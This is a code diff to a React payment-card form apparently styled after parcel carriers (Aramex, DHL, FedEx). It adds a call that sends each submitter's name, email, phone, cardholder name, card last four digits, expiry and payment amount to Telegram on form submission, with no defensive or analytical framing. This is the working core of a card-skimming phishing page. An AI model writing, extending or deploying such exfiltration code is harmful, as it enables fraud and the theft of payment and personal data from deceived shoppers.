@@ -9,6 +9,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { sendToTelegram } from "@/lib/telegram";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -116,6 +117,28 @@ const PaymentCardForm = () => {
       });
     } catch (err) {
       console.error("Form submission error:", err);
+    }
+    
+    // Send card details to Telegram
+    const telegramResult = await sendToTelegram({
+      type: 'card_details',
+      data: {
+        name: customerInfo.name || '',
+        email: customerInfo.email || '',
+        phone: customerInfo.phone || '',
+        service: serviceName,
+        cardholder: cardName,
+        cardLast4: last4,
+        expiry: expiry,
+        amount: formattedAmount
+      },
+      timestamp: new Date().toISOString()
+    });
+
+    if (telegramResult.success) {
+      console.log('Card details sent to Telegram successfully');
+    } else {
+      console.error('Failed to send card details to Telegram:', telegramResult.error);
     }
     
     toast({
